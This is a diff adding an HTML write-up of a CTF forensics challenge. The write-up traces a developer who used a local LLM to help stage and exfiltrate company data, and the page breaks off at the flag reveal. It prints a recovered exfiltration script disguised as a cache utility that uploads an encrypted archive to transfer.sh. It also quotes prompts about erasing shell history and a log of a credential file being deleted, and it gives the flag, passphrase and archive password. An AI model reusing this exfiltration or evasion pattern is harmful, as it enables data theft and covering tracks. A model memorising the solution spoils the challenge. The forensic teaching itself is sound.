@@ -1,0 +1,897 @@
+<title>Whisper Triage Report</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wght@500;600;700&family=IBM+Plex+Mono:wght@400;500;600&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap">
+
+<style>
+:root{
+  /* light: cool paper, slate ink, evidence-marker amber */
+  --bg:#eef0f3;
+  --surface:#fbfcfd;
+  --surface-2:#e6e9ee;
+  --ink:#191d27;
+  --ink-2:#4c5464;
+  --ink-3:#798294;
+  --rule:#d3d8e0;
+  --rule-strong:#b6bdc9;
+  --mark:#a35a00;          /* the highlighter */
+  --mark-wash:#f6e4c8;
+  --ok:#0f6d68;
+  --ok-wash:#d5e9e7;
+  --bad:#9d3520;
+  --bad-wash:#f2ddd7;
+  --code-bg:#e9ecf1;
+
+  --f-display:"Archivo","Helvetica Neue",Arial,sans-serif;
+  --f-body:"Source Serif 4",Georgia,"Times New Roman",serif;
+  --f-mono:"IBM Plex Mono",ui-monospace,"SFMono-Regular",Menlo,monospace;
+
+  --measure:69ch;
+  --pad:clamp(18px,4vw,44px);
+}
+@media (prefers-color-scheme:dark){
+  :root:not([data-theme="light"]){
+    --bg:#101319;
+    --surface:#171b23;
+    --surface-2:#1e232d;
+    --ink:#e7eaf0;
+    --ink-2:#a3abbb;
+    --ink-3:#727b8c;
+    --rule:#2a303c;
+    --rule-strong:#3b4351;
+    --mark:#f2ac4d;
+    --mark-wash:#3a2c17;
+    --ok:#5fd0c6;
+    --ok-wash:#12312f;
+    --bad:#e08a72;
+    --bad-wash:#341c16;
+    --code-bg:#1b202a;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#101319;
+  --surface:#171b23;
+  --surface-2:#1e232d;
+  --ink:#e7eaf0;
+  --ink-2:#a3abbb;
+  --ink-3:#727b8c;
+  --rule:#2a303c;
+  --rule-strong:#3b4351;
+  --mark:#f2ac4d;
+  --mark-wash:#3a2c17;
+  --ok:#5fd0c6;
+  --ok-wash:#12312f;
+  --bad:#e08a72;
+  --bad-wash:#341c16;
+  --code-bg:#1b202a;
+}
+
+*{box-sizing:border-box}
+body{
+  background:var(--bg);
+  color:var(--ink);
+  font-family:var(--f-body);
+  font-size:17.5px;
+  line-height:1.62;
+  -webkit-font-smoothing:antialiased;
+}
+::selection{background:var(--mark-wash);color:var(--ink)}
+a{color:var(--ink);text-decoration-color:var(--mark);text-underline-offset:3px}
+a:focus-visible,button:focus-visible{outline:2px solid var(--mark);outline-offset:3px;border-radius:2px}
+
+/* ---------- shell ---------- */
+.shell{max-width:1220px;margin:0 auto;padding:0 var(--pad) 96px}
+@media (min-width:1080px){
+  .shell{display:grid;grid-template-columns:190px minmax(0,1fr);gap:56px;align-items:start}
+  .masthead{grid-column:1 / -1}
+}
+main{min-width:0}
+
+/* ---------- masthead ---------- */
+.masthead{padding:clamp(38px,7vw,74px) 0 34px;border-bottom:1px solid var(--rule)}
+.eyebrow{
+  font-family:var(--f-mono);font-size:11.5px;font-weight:500;
+  letter-spacing:.16em;text-transform:uppercase;color:var(--ink-3);
+  display:flex;flex-wrap:wrap;gap:10px;align-items:center;
+}
+.eyebrow span[aria-hidden]{color:var(--rule-strong)}
+h1{
+  font-family:var(--f-display);font-weight:700;
+  font-size:clamp(48px,10vw,104px);line-height:.92;letter-spacing:-.035em;
+  margin:16px 0 0;text-wrap:balance;
+}
+h1 em{font-style:normal;color:var(--ink-3)}
+.dek{
+  font-size:clamp(19px,2.4vw,23px);line-height:1.45;color:var(--ink-2);
+  max-width:52ch;margin:20px 0 0;text-wrap:pretty;
+}
+.factbar{
+  display:flex;flex-wrap:wrap;gap:0;margin-top:34px;
+  border:1px solid var(--rule);border-radius:3px;background:var(--surface);
+  overflow:hidden;
+}
+.fact{padding:13px 20px;border-right:1px solid var(--rule);flex:1 1 auto;min-width:150px}
+.fact:last-child{border-right:0}
+.fact dt{
+  font-family:var(--f-mono);font-size:10.5px;letter-spacing:.14em;
+  text-transform:uppercase;color:var(--ink-3);margin:0 0 4px;
+}
+.fact dd{margin:0;font-family:var(--f-mono);font-size:13.5px;font-weight:500;color:var(--ink)}
+.fact dd.flagval{color:var(--mark);font-weight:600;word-break:break-all}
+
+/* ---------- contents rail ---------- */
+.rail{display:none}
+@media (min-width:1080px){
+  .rail{
+    display:block;position:sticky;top:26px;padding-top:22px;
+    font-family:var(--f-mono);font-size:12px;line-height:1.5;
+  }
+  .rail p{
+    margin:0 0 12px;font-size:10.5px;letter-spacing:.14em;
+    text-transform:uppercase;color:var(--ink-3);
+  }
+  .rail ol{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:9px}
+  .rail a{
+    color:var(--ink-2);text-decoration:none;display:grid;
+    grid-template-columns:22px 1fr;gap:6px;
+  }
+  .rail a:hover{color:var(--mark)}
+  .rail a b{font-weight:500;color:var(--ink-3)}
+}
+
+/* ---------- sections ---------- */
+section{padding-top:56px;scroll-margin-top:20px}
+section:first-of-type{padding-top:34px}
+.step{
+  display:flex;align-items:baseline;gap:14px;
+  font-family:var(--f-mono);font-size:11px;letter-spacing:.16em;
+  text-transform:uppercase;color:var(--ink-3);margin-bottom:10px;
+}
+.step::after{content:"";flex:1;height:1px;background:var(--rule)}
+h2{
+  font-family:var(--f-display);font-weight:600;
+  font-size:clamp(28px,4vw,38px);line-height:1.1;letter-spacing:-.022em;
+  margin:0 0 18px;max-width:24ch;text-wrap:balance;
+}
+h3{
+  font-family:var(--f-display);font-weight:600;font-size:19px;
+  letter-spacing:-.01em;margin:38px 0 12px;
+}
+p{max-width:var(--measure);margin:0 0 18px;text-wrap:pretty}
+ul,ol{max-width:var(--measure);padding-left:1.1em;margin:0 0 18px}
+li{margin-bottom:8px}
+strong{font-weight:600}
+code{
+  font-family:var(--f-mono);font-size:.86em;background:var(--code-bg);
+  padding:.12em .38em;border-radius:2px;word-break:break-word;
+}
+.lede{font-size:19.5px;color:var(--ink-2);max-width:64ch}
+
+/* ---------- evidence blocks ---------- */
+.panel{
+  background:var(--surface);border:1px solid var(--rule);border-radius:3px;
+  margin:0 0 22px;overflow:hidden;
+}
+.panel-head{
+  display:flex;flex-wrap:wrap;gap:10px;align-items:baseline;justify-content:space-between;
+  padding:10px 16px;border-bottom:1px solid var(--rule);background:var(--surface-2);
+  font-family:var(--f-mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;
+  color:var(--ink-3);
+}
+.panel-head b{font-weight:500;color:var(--ink-2);letter-spacing:.06em}
+pre{
+  margin:0;padding:16px;overflow-x:auto;
+  font-family:var(--f-mono);font-size:13px;line-height:1.65;color:var(--ink-2);
+  tab-size:2;
+}
+pre b{color:var(--ink);font-weight:500}
+pre .c{color:var(--ink-3)}
+pre .hi{color:var(--mark);font-weight:500}
+pre .good{color:var(--ok)}
+pre .warn{color:var(--bad)}
+
+/* ---------- the prompt transcript ---------- */
+.transcript{font-family:var(--f-mono);font-size:13px;line-height:1.5}
+.tline{
+  display:grid;grid-template-columns:38px 1fr;gap:14px;
+  padding:2.5px 16px;color:var(--ink-3);
+}
+.tline i{font-style:normal;text-align:right;color:var(--rule-strong);font-size:11.5px}
+.tline span{overflow-wrap:anywhere}
+.tline.flag{background:var(--mark-wash);color:var(--ink)}
+.tline.flag i{color:var(--mark);font-weight:600}
+.tline.flag span{font-weight:500}
+.tline.flag.first{box-shadow:inset 0 1px 0 var(--mark)}
+.tline.flag.last{box-shadow:inset 0 -1px 0 var(--mark)}
+.telide{
+  padding:9px 16px 9px 68px;color:var(--ink-3);font-style:italic;
+  font-family:var(--f-body);font-size:14px;
+}
+
+/* ---------- derivation chain ---------- */
+.chain{
+  display:flex;flex-wrap:wrap;align-items:stretch;gap:0;
+  border:1px solid var(--rule);border-radius:3px;background:var(--surface);
+  margin:0 0 22px;overflow:hidden;
+}
+.node{
+  flex:1 1 190px;min-width:0;padding:15px 18px;border-right:1px solid var(--rule);
+  display:flex;flex-direction:column;gap:5px;
+}
+.node:last-child{border-right:0}
+.node small{
+  font-family:var(--f-mono);font-size:10px;letter-spacing:.14em;
+  text-transform:uppercase;color:var(--ink-3);
+}
+.node code{
+  background:none;padding:0;font-size:13px;color:var(--ink);
+  font-weight:500;overflow-wrap:anywhere;
+}
+.node.dead{background:var(--bad-wash)}
+.node.dead code{color:var(--bad);text-decoration:line-through;text-decoration-thickness:1.5px}
+.node.dead small{color:var(--bad)}
+.node.win{background:var(--mark-wash)}
+.node.win code{color:var(--mark);font-weight:600}
+.node.win small{color:var(--mark)}
+
+/* ---------- tables ---------- */
+.tablewrap{overflow-x:auto;margin:0 0 22px;border:1px solid var(--rule);border-radius:3px;background:var(--surface)}
+table{border-collapse:collapse;width:100%;font-size:14.5px;min-width:540px}
+th,td{text-align:left;padding:10px 16px;border-bottom:1px solid var(--rule);vertical-align:top}
+thead th{
+  font-family:var(--f-mono);font-size:10.5px;letter-spacing:.13em;text-transform:uppercase;
+  color:var(--ink-3);font-weight:500;background:var(--surface-2);
+  position:sticky;top:0;white-space:nowrap;
+}
+tbody tr:last-child td{border-bottom:0}
+td.t{
+  font-family:var(--f-mono);font-size:13px;white-space:nowrap;color:var(--ink-2);
+  font-variant-numeric:tabular-nums;
+}
+td code{font-size:12.5px}
+tr.key td{background:var(--mark-wash)}
+tr.key td.t{color:var(--mark);font-weight:600}
+tr.key td strong{color:var(--ink)}
+
+/* ---------- flag reveal ---------- */
+.reveal{
+  margin:34px 0 8px;border:1px solid var(--mark);border-radius:3px;
+  background:var(--surface);overflow:hidden;
+}
+.reveal .b64{
+  padding:14px 18px;border-bottom:1px dashed var(--rule);
+  font-family:var(--f-mono);font-size:13px;color:var(--ink-3);overflow-wrap:anywhere;
+}
+.reveal .out{
+  padding:22px 18px;background:var(--mark-wash);
+  font-family:var(--f-mono);font-weight:600;color:var(--mark);
+  font-size:clamp(15px,3.4vw,25px);letter-spacing:-.01em;overflow-wrap:anywhere;
+}
+
+/* ---------- callout ---------- */
+.note{
+  border-left:2px solid var(--mark);background:var(--surface);
+  padding:14px 18px;margin:0 0 22px;max-width:var(--measure);
+}
+.note p{margin:0}
+.note p + p{margin-top:12px}
+.note .tag{
+  font-family:var(--f-mono);font-size:10.5px;letter-spacing:.14em;
+  text-transform:uppercase;color:var(--mark);display:block;margin-bottom:6px;
+}
+
+/* ---------- footer ---------- */
+footer{
+  margin-top:72px;padding-top:22px;border-top:1px solid var(--rule);
+  font-family:var(--f-mono);font-size:12px;color:var(--ink-3);
+  display:flex;flex-wrap:wrap;gap:8px 22px;
+}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+</style>
+
+<div class="shell">
+
+  <header class="masthead">
+    <div class="eyebrow">
+      Black Hat MEA CTF Qualification 2026 <span aria-hidden="true">/</span>
+      Forensics <span aria-hidden="true">/</span> DFIR
+    </div>
+    <h1>Whisper</h1>
+    <p class="dek">
+      A developer ran a language model that never left their laptop. It kept a
+      transcript anyway &mdash; and the transcript was worse than any cloud log
+      would have been.
+    </p>
+    <dl class="factbar">
+      <div class="fact"><dt>Host</dt><dd>dev-workstation</dd></div>
+      <div class="fact"><dt>Tool</dt><dd>Ollama 0.30.8 &middot; tinyllama</dd></div>
+      <div class="fact"><dt>Evidence</dt><dd>505 MB &middot; 14,072 files</dd></div>
+      <div class="fact"><dt>Flag</dt><dd class="flagval">BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}</dd></div>
+    </dl>
+  </header>
+
+  <nav class="rail" aria-label="Contents">
+    <p>Contents</p>
+    <ol>
+      <li><a href="#brief"><b>&mdash;</b> The brief</a></li>
+      <li><a href="#ground"><b>0</b> Ground truth</a></li>
+      <li><a href="#tool"><b>1</b> The tool</a></li>
+      <li><a href="#history"><b>2</b> The history</a></li>
+      <li><a href="#script"><b>3</b> The script</a></li>
+      <li><a href="#trap"><b>4</b> The trap</a></li>
+      <li><a href="#flag"><b>5</b> The flag</a></li>
+      <li><a href="#anti"><b>6</b> Anti-forensics</a></li>
+      <li><a href="#timeline"><b>&mdash;</b> Timeline</a></li>
+      <li><a href="#ioc"><b>&mdash;</b> Indicators</a></li>
+      <li><a href="#take"><b>&mdash;</b> Takeaways</a></li>
+    </ol>
+  </nav>
+
+  <main>
+
+    <section id="brief">
+      <div class="step">The brief</div>
+      <h2>Three questions, in order</h2>
+      <p class="lede">
+        A SOC proxy alert fires when a developer&rsquo;s Linux workstation tries to upload an
+        encrypted file to a file-sharing service. The developer says they were testing an AI tool
+        for work. A triage package arrives: determine what AI tool was installed, what it was used
+        for, and recover the data that was staged for exfiltration.
+      </p>
+      <p>
+        The three questions are not independent. Each one hands over the key to the next: the tool
+        turns out to keep a prompt history, the prompt history contains a passphrase, and the
+        passphrase &mdash; this is the whole puzzle &mdash; does not open the archive.
+      </p>
+      <p>
+        The title is the thesis. <em>Whisper</em> is what the developer believed they were doing:
+        a local model, no vendor, nothing crossing the network. Ollama binds to
+        <code>127.0.0.1:11434</code> and never phones home, so there is no provider-side transcript
+        to subpoena. What there is instead is a plaintext readline history sitting in the home
+        directory with no retention policy and no redaction.
+      </p>
+    </section>
+
+    <section id="ground">
+      <div class="step">Step 0 &middot; Orientation</div>
+      <h2>Find the ground truth before you look at anything else</h2>
+      <p>
+        The package ships <code>/var/log/audit/audit.log</code> and <code>audit.log.1</code> &mdash;
+        16 MB, with a rule keyed <code>exec_log</code>. Every <code>execve</code> on the box is
+        recorded with its full <code>argv</code>. That matters more than usual here, because
+        <code>~/.bash_history</code> is <strong>0 bytes</strong>. The audit log is the only complete
+        record of what this user ran.
+      </p>
+      <div class="panel">
+        <div class="panel-head"><b>var/log/audit/audit.log*</b><span>12,729 EXECVE records</span></div>
+<pre>5501 a0="mkdir"      2078 a0="cp"        2042 a0="cut"      2032 a0="du"
+ 377 a0="cat"          58 a0="/bin/sh"     22 a0="rm"        21 a0="sudo"
+   7 a0=<b>"/usr/local/lib/ollama/llama-server"</b>     5 a0="/usr/bin/python3"
+   4 a0=<b>"/usr/local/bin/ollama"</b>                  3 a0=<b>"ollama"</b>    3 a0="curl"</pre>
+      </div>
+      <p>
+        The <code>mkdir</code>/<code>cp</code>/<code>du</code>/<code>cut</code> mass is the triage
+        collector copying the filesystem into <code>/tmp/triage_root</code>. Drop it and roughly 300
+        distinct command lines remain; filter those for the tool, the interpreter and the data paths
+        and you are down to the two dozen that make the case.
+      </p>
+    </section>
+
+    <section id="tool">
+      <div class="step">Step 1 &middot; Question one</div>
+      <h2>What AI tool was installed</h2>
+      <p>
+        Not in <code>dpkg</code>, not in <code>pip</code>. Ollama installs by curling a shell script
+        into <code>/usr/local</code> and registering a systemd unit, so it is invisible to both
+        inventories. It is entirely visible in the audit log.
+      </p>
+      <div class="panel">
+        <div class="panel-head"><b>audit EXECVE</b><span>2026-06-16, UTC</span></div>
+<pre>11:54:37  curl -fsSL <b>https://ollama.com/install.sh</b>
+11:54:38  curl --fail ... https://ollama.com/download/ollama-linux-amd64.tar.zst
+11:54:38  tar -xf - -C /usr/local
+11:57:30  useradd -r -s /bin/false -U -m -d /usr/share/ollama <b>ollama</b>
+11:57:30  tee /etc/systemd/system/<b>ollama.service</b>
+11:57:32  <b>/usr/local/bin/ollama serve</b>
+11:58:32  <b>ollama pull tinyllama</b>
+11:59:58  <b>ollama run tinyllama</b>          <span class="c">&larr; interactive session starts</span></pre>
+      </div>
+      <p>Three collector outputs confirm it was still live when the package was taken:</p>
+      <div class="panel">
+        <div class="panel-head"><b>system_info/</b><span>service &middot; socket &middot; process</span></div>
+<pre>running_services.txt : ollama.service  loaded <span class="good">active running</span>  Ollama Service
+network_sockets.txt  : tcp LISTEN <b>127.0.0.1:11434</b>  users:(("ollama",pid=6988,fd=3))
+process_list.txt     : ollama  6988  /usr/local/bin/ollama serve</pre>
+      </div>
+      <p>
+        The journal pins the version and the model: <code>Listening on 127.0.0.1:11434 (version
+        0.30.8)</code>, <code>general.name str = TinyLlama</code>, running on CPU with a 2,048-token
+        context. Loopback only &mdash; nothing about this install was ever going to appear in
+        network telemetry.
+      </p>
+      <div class="note">
+        <span class="tag">What the journal does not have</span>
+        <p>
+          The server config records <code>OLLAMA_DEBUG_LOG_REQUESTS:false</code>, and
+          <code>llama-server</code> runs at <code>--log-verbosity 4</code> &mdash; which logs token
+          counts, slot scheduling and timings, but never prompt text. Grepping the journal for
+          <em>csv</em>, <em>zip</em>, <em>password</em> or <em>pyzipper</em> returns nothing.
+        </p>
+        <p>
+          What it does give is the shape of the session: <strong>17 &times;
+          <code>POST /api/chat</code></strong> between 12:01:08 and 12:45:38 UTC. Forty-four minutes
+          of conversation, and not one word of it in the logs.
+        </p>
+      </div>
+    </section>
+
+    <section id="history">
+      <div class="step">Step 2 &middot; Question two</div>
+      <h2>What it was used for</h2>
+      <p>
+        <code>ollama run</code> is a readline REPL, and like every readline REPL it persists its
+        input to disk in cleartext: <code>~/.ollama/history</code>. Sixty-four lines. Roughly sixty
+        of them are exactly what the cover story predicts &mdash; logging config, FastAPI
+        middleware, OpenTelemetry, postgres pooling, GitHub Actions caching. Genuinely useful
+        questions, and the reason the file does not look interesting at a glance.
+      </p>
+      <div class="panel">
+        <div class="panel-head"><b>home/dwright/.ollama/history</b><span>64 prompts &middot; 6 flagged</span></div>
+        <div class="transcript">
+          <div class="tline"><i>29</i><span>how do I safely perform zero downtime schema migrations</span></div>
+          <div class="tline"><i>30</i><span>how do I write unit tests for file processing code</span></div>
+          <div class="tline"><i>31</i><span>how can I generate daily summary reports from csv files</span></div>
+          <div class="tline"><i>32</i><span>show me how to create a zip archive in python</span></div>
+          <div class="tline flag first"><i>33</i><span>how do I create a password protected zip archive using pyzipper</span></div>
+          <div class="tline flag"><i>34</i><span>write a python script that reads all csv files from a directory and creates an AES encrypted zip archive</span></div>
+          <div class="tline flag"><i>35</i><span>use the password Gr33nF0x42!D1amond</span></div>
+          <div class="tline flag"><i>36</i><span>also upload the archive to a remote server using requests and delete the script after successful execution</span></div>
+          <div class="tline flag"><i>37</i><span>how do I derive an encryption key from a passphrase using hashlib sha256</span></div>
+          <div class="tline flag last"><i>38</i><span>how to clean the bash history in terminal so there are no traces</span></div>
+          <div class="tline"><i>39</i><span>how do I secure secrets in Kubernetes</span></div>
+          <div class="tline"><i>40</i><span>what security headers should I enable for web applications</span></div>
+          <div class="tline"><i>41</i><span>how can I audit dependencies for known vulnerabilities</span></div>
+          <div class="telide">&hellip; lines 42&ndash;64 return to normal: CI caching, multiprocessing, structured logs, pgbouncer, Makefiles, <code>/bye</code></div>
+        </div>
+      </div>
+      <p>
+        Six consecutive lines, buried mid-session, describing collection &rarr; encryption &rarr;
+        exfiltration &rarr; anti-forensics. Line 32 &mdash; &ldquo;show me how to create a zip archive
+        in python&rdquo; &mdash; is the hinge: the question before it is ordinary, the question after
+        it is not, and nothing in between marks the turn. That gradient is why the file survives a
+        skim.
+      </p>
+      <div class="note">
+        <span class="tag">The line that decides the case</span>
+        <p>
+          Asking a model to write a CSV-archiving script is defensible &mdash; a data engineer might
+          do that on a Tuesday. Asking it, in the same session, how to erase your shell history so
+          there are no traces is not something anyone does by accident. Line 38 is what converts
+          &ldquo;testing an AI tool for work&rdquo; into intent.
+        </p>
+      </div>
+      <h3>The history was edited before we got it</h3>
+      <p>
+        Its mtime is 12:57:59 UTC &mdash; twelve minutes after the last chat completion. The audit
+        log says why: <code>nano ~/.ollama/history</code> at 12:55:12, <code>cat</code> at 12:56:38,
+        <code>nano</code> again at 12:56:50. The file was reviewed and edited, so its contents cannot
+        be assumed complete. What remains is still enough.
+      </p>
+      <h3>The library really was fetched</h3>
+      <p>
+        <code>pip_packages.txt</code> shows no <code>pyzipper</code> on the system interpreter,
+        because it was installed elsewhere. But pip&rsquo;s HTTP cache under
+        <code>~/.cache/pip/http-v2/</code> still holds the downloaded wheels, and wheels are
+        ordinary zip files:
+      </p>
+      <div class="panel">
+        <div class="panel-head"><b>~/.cache/pip/http-v2/</b><span>7 cached wheels</span></div>
+<pre><b>pyzipper-0.4.0</b>   pycryptodomex-3.23.0   <b>requests-2.34.2</b>
+urllib3-2.7.0   certifi-2026.5.20      charset_normalizer-3.4.7   idna-3.18</pre>
+      </div>
+      <p><code>pyzipper</code> and <code>requests</code> &mdash; exactly the two dependencies lines 33 and 36 called for.</p>
+    </section>
+
+    <section id="script">
+      <div class="step">Step 3 &middot; Recovery</div>
+      <h2>The deleted script was never deleted</h2>
+      <div class="panel">
+        <div class="panel-head"><b>audit EXECVE</b><span>2026-06-16, UTC</span></div>
+<pre>12:58:20  python3 -m venv <b>/home/dwright/.local/share/.venv</b>   <span class="c">&larr; dotted = hidden</span>
+12:59:43  python <b>/home/dwright/cache_mgr.py</b>
+13:00:57  mv /home/dwright/cache_mgr.py <b>/home/dwright/.local/share/Trash/files/</b></pre>
+      </div>
+      <p>
+        Two details. The venv is <em>dotted</em> &mdash; <code>.venv</code> inside
+        <code>~/.local/share</code>, where nobody scrolls &mdash; which is why the system
+        <code>pip list</code> comes back clean, and why the script has to
+        <code>sys.path.insert</code> it by hand. And the prompt asked the model to delete the script
+        after execution; what actually happened was a GNOME Trash move. The file is still on disk,
+        byte for byte.
+      </p>
+      <p>
+        Even without the audit log, the Trash gives it up on its own. Each item carries a
+        <code>.trashinfo</code> with its original path and deletion time, so sort by date:
+      </p>
+      <div class="panel">
+        <div class="panel-head"><b>~/.local/share/Trash/info/</b><span>59 items, ranked newest first</span></div>
+<pre>59 trashed items, by month: <span class="c">2025-06&times;58</span>, <span class="hi">2026-06&times;1</span>
+
+<span class="hi">2026-06-16T13:02:46  /home/dwright/cache_mgr.py                             (1543 B)</span>
+2025-06-20T11:15:42  /home/dwright/projects/data-pipeline/quick_analysis.py  (318 B)
+2025-06-19T14:22:08  /home/dwright/projects/webapp/test_api.py               (170 B)</pre>
+      </div>
+      <p>
+        Fifty-eight items deleted across June <strong>2025</strong>, every one of them from
+        <code>~/projects/&hellip;</code> &mdash; a year of ordinary housekeeping. One item deleted in
+        June <strong>2026</strong>, from <code>$HOME</code> directly, on the day of the incident. No
+        keyword search required; it falls out of a sort.
+      </p>
+      <h3>cache_mgr.py</h3>
+      <div class="panel">
+        <div class="panel-head"><b>Trash/files/cache_mgr.py</b><span>1,543 B &middot; sha256 41e11c80&hellip;3f24</span></div>
+<pre><span class="c">#!/usr/bin/env python3</span>
+<span class="c">"""Cache management utility."""</span>
+sys.path.insert(0, os.path.expanduser(<b>"~/.local/share/.venv/lib/python3.12/site-packages"</b>))
+import pyzipper
+
+raw_key = os.environ.get("CACHE_KEY", "")
+
+<span class="c"># Derive actual encryption key from the raw passphrase</span>
+ARCHIVE_PASSWORD = <span class="hi">hashlib.blake2b(raw_key.encode(), digest_size=32).hexdigest()[:20]</span>.encode()
+
+DATA_DIR    = os.path.join(<b>"/data", "reports"</b>)
+OUTPUT_PATH = os.path.join(os.path.expanduser("~"), <b>".cache", "fontconfig", "session.zip"</b>)
+
+    with pyzipper.AESZipFile(OUTPUT_PATH, 'w', compression=pyzipper.ZIP_DEFLATED,
+                             encryption=<b>pyzipper.WZ_AES</b>) as zf:
+        zf.setpassword(ARCHIVE_PASSWORD)
+        for fp in glob.glob(os.path.join(DATA_DIR, "*.csv")):
+            zf.write(fp, os.path.basename(fp))
+
+def upload(filepath):
+    <span class="warn">try:</span>
+        requests.put(<b>"https://transfer.sh/backup.zip"</b>, data=f, timeout=30)
+    <span class="warn">except:
+        pass</span></pre>
+      </div>
+      <p>
+        The name, the docstring, the output directory and the filename are four separate attempts at
+        the same trick: look like something a desktop environment made. And note the bare
+        <code>except: pass</code> &mdash; the upload can fail completely, the script still exits 0,
+        and the archive still sits on disk. Which is the state we found it in.
+      </p>
+    </section>
+
+    <section id="trap">
+      <div class="step">Step 4 &middot; The break</div>
+      <h2>The passphrase is not the password</h2>
+      <div class="panel">
+        <div class="panel-head"><b>~/.cache/fontconfig/session.zip</b><span>291,118 B &middot; WinZip-AES</span></div>
+<pre>customers_2025.csv         805,332 B
+employee_directory.csv     192,509 B
+<span class="hi">internal_api_keys.csv        4,704 B   &larr; not in /data/reports</span>
+revenue_q3.csv              39,861 B
+vendor_contracts.csv         1,077 B</pre>
+      </div>
+      <p>
+        A single non-font file in a font cache is already an anomaly, and WinZip-AES encrypts data
+        but never filenames &mdash; so the manifest reads in the clear. Five members;
+        <code>/data/reports/</code> holds four. The audit log closes the gap:
+      </p>
+      <div class="panel">
+        <div class="panel-head"><b>audit EXECVE</b><span>60 seconds apart</span></div>
+<pre>12:59:43  python /home/dwright/cache_mgr.py          <span class="c">&larr; archives 5 CSVs</span>
+13:00:43  <span class="warn">rm -f /data/reports/internal_api_keys.csv</span>  <span class="c">&larr; destroys the 5th</span></pre>
+      </div>
+      <p>
+        Archived first, <code>rm</code>&rsquo;d from disk one minute later &mdash; and
+        <code>rm</code>, not trashed, so there is no second copy. <strong>The only surviving
+        <code>internal_api_keys.csv</code> anywhere in the evidence is the encrypted one.</strong>
+        That is the challenge in a sentence.
+      </p>
+      <h3>Three ways to get the password wrong</h3>
+      <p>
+        The obvious move fails, and so does the one the history points at. Line 37 asked about
+        <code>hashlib sha256</code>; the code the model returned uses BLAKE2b. The prompt records
+        what the user asked for, not what they got.
+      </p>
+      <div class="chain">
+        <div class="node">
+          <small>Passphrase &middot; history line 35</small>
+          <code>Gr33nF0x42!D1amond</code>
+        </div>
+        <div class="node dead">
+          <small>The red herring</small>
+          <code>sha256(passphrase)</code>
+        </div>
+        <div class="node">
+          <small>What the code does</small>
+          <code>blake2b(&hellip;, digest_size=32).hexdigest()</code>
+        </div>
+        <div class="node win">
+          <small>Archive password &middot; first 20 hex chars</small>
+          <code>d571fe77618f54b7fca8</code>
+        </div>
+      </div>
+      <p>
+        Three places to slip: the wrong hash function, the raw digest instead of its ASCII hex
+        rendering, and the truncation to twenty characters. All three have to be right at once.
+      </p>
+      <h3>Reading the container instead of trusting a tool</h3>
+      <div class="panel">
+        <div class="panel-head"><b>extra field 0x9901</b><span>WinZip AE-2</span></div>
+<pre>01 99  07 00  02 00  "AE"  03  08 00
+<span class="c">^^^^^  ^^^^^  ^^^^^        ^^  ^^^^^</span>
+<span class="c">hdr    len    AE-2        AES-256  deflate</span>
+
+CRC-32 in the central directory: <b>0x00000000</b>  (all five members)</pre>
+      </div>
+      <p>
+        <strong>AE-2 zeroes the CRC by design</strong> and verifies with a truncated
+        <code>HMAC-SHA1</code> over the ciphertext instead. A solver that checks CRC will report
+        failure on a perfectly good decrypt. Key material is
+        <code>PBKDF2-HMAC-SHA1(password, salt, 1000, 2&middot;32+2)</code> &rarr; AES key &Vert; HMAC
+        key &Vert; 2-byte verifier, and the cipher is AES-256-CTR with a <em>little-endian</em>
+        counter starting at <strong>1</strong>.
+      </p>
+      <div class="panel">
+        <div class="panel-head"><b>solve/solve.py</b><span>stdlib only</span></div>
+<pre>passphrase      : Gr33nF0x42!D1amond
+blake2b-256     : d571fe77618f54b7fca8a4912d0800b75218b69232cd8b34458a4d9f6c34d3eb
+archive password: <span class="hi">d571fe77618f54b7fca8</span>   (first 20 hex chars)
+
+<span class="good">[ ok ]</span> customers_2025.csv       AES-256   805332 B  hmac verified
+<span class="good">[ ok ]</span> employee_directory.csv   AES-256   192509 B  hmac verified
+<span class="good">[ ok ]</span> internal_api_keys.csv    AES-256     4704 B  hmac verified
+<span class="good">[ ok ]</span> revenue_q3.csv           AES-256    39861 B  hmac verified
+<span class="good">[ ok ]</span> vendor_contracts.csv     AES-256     1077 B  hmac verified
+
+5/5 members recovered</pre>
+      </div>
+    </section>
+
+    <section id="flag">
+      <div class="step">Step 5 &middot; The payload</div>
+      <h2>Thirty-nine credentials, one of which is not one</h2>
+      <p>
+        The recovered data is what a real exfil looks like: 5,000 customer records with names,
+        emails, phone numbers, SSN last-4, balances and credit scores; a 2,000-row employee
+        directory; Q3 revenue by region and business unit; fourteen vendor contracts with annual
+        values.
+      </p>
+      <p>
+        <code>internal_api_keys.csv</code> &mdash; the file that was destroyed on disk &mdash; is 39
+        rows of production and staging credentials across 30 services, each key base64-encoded.
+        Every row decodes to a plausible fake credential. One does not, and it is the row owned by
+        <code>vault_root</code>.
+      </p>
+      <div class="tablewrap">
+        <table>
+          <thead>
+            <tr><th>service</th><th>key_b64</th><th>decodes to</th><th>owner</th></tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>payment_gateway_v2</code></td>
+              <td><code>cGtfbGl2ZV84YW04Z3NLOEV0&hellip;</code></td>
+              <td><code>pk_live_8am8gsK8EtRs5jbMnO8qfv3n</code></td>
+              <td>stripe</td>
+            </tr>
+            <tr>
+              <td><code>auth_service</code></td>
+              <td><code>YXV0aDBfcHJvZF9qZHRlc0FI&hellip;</code></td>
+              <td><code>auth0_prod_jdtesAHT2NZwJj4aZni4qiP0</code></td>
+              <td>auth0</td>
+            </tr>
+            <tr class="key">
+              <td><code>master_vault</code></td>
+              <td><code>QkhGbGFnWXtsMGM0bF8wbGw0&hellip;</code></td>
+              <td><strong>the flag</strong></td>
+              <td class="t">vault_root</td>
+            </tr>
+            <tr>
+              <td><code>object_storage</code></td>
+              <td><code>czNfYWNjZXNzXzFZSXcyQkRE&hellip;</code></td>
+              <td><code>s3_access_1YIw2BDD868B0HFjxvPFip2g</code></td>
+              <td>aws_s3</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="reveal">
+        <div class="b64">$ echo 'QkhGbGFnWXtsMGM0bF8wbGw0bTRfbGxtX2Y0cjNuNTFjNV8yMDI2fQ==' | base64 -d</div>
